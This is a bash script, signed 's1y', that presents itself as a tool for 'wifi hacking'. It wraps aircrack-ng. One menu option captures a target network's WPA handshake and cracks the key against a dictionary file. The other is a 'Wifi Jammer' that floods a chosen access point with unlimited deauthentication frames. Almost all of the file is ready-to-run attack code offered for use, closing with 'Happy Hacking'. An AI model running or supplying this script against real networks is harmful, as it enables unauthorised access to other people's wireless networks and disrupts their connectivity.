#!/bin/bash

logo () {
echo -e "$(tput setaf 35)
███████╗ ██╗██╗   ██╗███████╗    ██╗    ██╗██╗███████╗██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝███║╚██╗ ██╔╝██╔════╝    ██║    ██║██║██╔════╝██║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████╗╚██║ ╚████╔╝ ███████╗    ██║ █╗ ██║██║█████╗  ██║    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
╚════██║ ██║  ╚██╔╝  ╚════██║    ██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
███████║ ██║   ██║   ███████║    ╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚══════╝ ╚═╝   ╚═╝   ╚══════╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                             "
}
start () {
echo -e "$(tput setaf 2)Starting script:"
sleep 0.4
echo "~"
sleep 0.4
echo "~"
sleep 0.4
echo ~$(tput setaf 7)
sleep 0.4 	
clear
}
option () {
echo -e "$(tput setaf 1) \n               A script for wifi hacking.
        The script only Works if your wifi adapter has monitor mode."
echo -e "$(tput setaf 35)\n                       Developed by s1y ;)"
echo -e "\n$(tput setaf 3)                   [ Select Option To Continue ]\n\n"
echo "      $(tput setaf 45)[$(tput setaf 1)1$(tput setaf 45)] $(tput setaf 1)Wifi Hacking"
echo "      $(tput setaf 45)[$(tput setaf 1)2$(tput setaf 45)] $(tput setaf 45)Wifi Jammer"
echo -e "      $(tput setaf 45)[$(tput setaf 1)3$(tput setaf 45)] $(tput setaf 1)Exit\n\n$(tput setaf 7)"
}
hacking () {
airmon-ng start wlan0 > /dev/null
trap "airmon-ng stop wlan0mon > /dev/null" EXIT
airodump-ng wlan0mon
echo
read -p "$(tput setaf 1)Enter the target network BSSID > $(tput setaf 7)" bssid
echo
read -p "$(tput setaf 2)Enter the corresponding Channel > $(tput setaf 7)" ch
}
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
sudo apt-get install aircrack-ng;
fi
logo
option
while true; do
echo -n "Select Option: "
read number
case $number in
  1) clear
logo
start
hacking
x-terminal-emulator -e ./airplay.sh $bssid
airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
aircrack-ng -w dictionary/dictionary.txt files-01.cap
airmon-ng stop wlan0mon > /dev/null
rm files*
logo
option
    ;;
  2) clear
logo
start
hacking
airodump-ng --bssid $bssid --channel $ch wlan0mon
aireplay-ng -0 0 -a $bssid wlan0mon 
    ;;
  3) echo -e "$(tput setaf 35)\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     break;
    ;;
  *) echo -e "$(tput setaf 35)Please select correct option.$(tput setaf 7)"
    ;;
esac
done
